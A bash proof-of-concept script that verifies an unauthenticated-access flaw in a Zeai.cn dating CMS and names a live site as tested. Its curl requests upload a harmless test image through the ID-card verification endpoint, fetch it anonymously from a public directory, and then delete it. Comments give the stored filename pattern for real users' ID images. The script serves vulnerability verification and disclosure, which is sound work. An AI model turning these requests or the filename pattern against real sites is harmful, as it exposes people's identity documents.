#!/usr/bin/env bash
# zeai 婚恋 CMS：真人认证（KYC）证件影像落在公网静态目录，无鉴权可直取
# 适用：Zeai.cn V10.x 白牌婚恋站（520.wanghongniang.com 实测）
# 前置：一个任意普通会员会话（Cookie 放 COOKIE 变量）
set -u
BASE=${BASE:-https://520.wanghongniang.com}
COOKIE=${COOKIE:?需要会员 Cookie}
UA='Mozilla/5.0 (Linux; Android 16) Chrome/130 Mobile MicroMessenger/8.0.79'

# 1) 生成一张无害测试图（不要用真实证件！）
python3 - <<'PY'
from PIL import Image
Image.new('RGB',(16,16),(200,200,200)).save('/tmp/uptest.jpg','JPEG',quality=60)
PY

# 2) 走「身份证正面」上传口（back 用 ajax_rzidb_up_h5）
RESP=$(curl -s -A "$UA" -H "Cookie: $COOKIE" -H 'X-Requested-With: XMLHttpRequest' \
  -H "Referer: $BASE/m/my_cert.php" \
  -F 'submitok=ajax_rzidf_up_h5' -F 'file=@/tmp/uptest.jpg;type=image/jpeg' \
  "$BASE/m/my_cert.php")
echo "[upload] $RESP"

DB=$(printf '%s' "$RESP" | python3 -c 'import sys,json,re;print(json.load(sys.stdin).get("dbname",""))')
[ -z "$DB" ] && { echo "未拿到 dbname，停止"; exit 1; }

# 3) 无 Cookie 直取（关键判定：200 + image/* 即成立）
echo "[anon GET] $BASE/up/$DB"
curl -s -o /tmp/got.jpg -w 'http=%{http_code} size=%{size_download} type=%{content_type}\n' "$BASE/up/$DB"
ls -l /tmp/got.jpg

# 4) 清理（必须做）
curl -s -A "$UA" -H "Cookie: $COOKIE" -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode 'submitok=ajax_tmp_del' --data-urlencode "url=$DB" "$BASE/m/my_cert.php"
echo
curl -s -o /dev/null -w '[after delete] http=%{http_code}\n' "$BASE/up/$DB"

# 判定：3) 返回 200 且 4) 之后返回 301 ⇒ 证件影像确实落在公网静态目录且无鉴权
# 说明：目录无 autoindex；文件名 <uid>_RZ_<unixts><3rand>.jpg，逐人枚举代价高，
#       但任何一次 URL 泄露（截图/日志/Referer）即永久公开。
